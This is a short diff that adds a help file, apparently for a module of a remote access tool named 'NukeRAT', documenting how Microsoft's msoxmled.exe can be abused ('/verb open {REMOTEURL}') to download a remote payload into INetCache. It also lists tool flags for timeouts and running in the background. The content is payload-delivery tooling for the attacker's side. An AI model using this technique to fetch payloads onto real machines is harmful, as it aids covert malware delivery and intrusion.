@@ -1,0 +1,17 @@
+ABOUT
+    Microsoft Office XML Editor, used to handle XML documents in
+    Microsoft Office. LOLBAS documents it will download a remote
+    payload and place it in INetCache.
+
+USAGE:
+    msoxmled.exe /verb open {REMOTEURL}
+
+EXAMPLES:
+    msoxmled.exe /verb open {REMOTEURL}
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    msoxmled.exe /verb open {REMOTEURL}
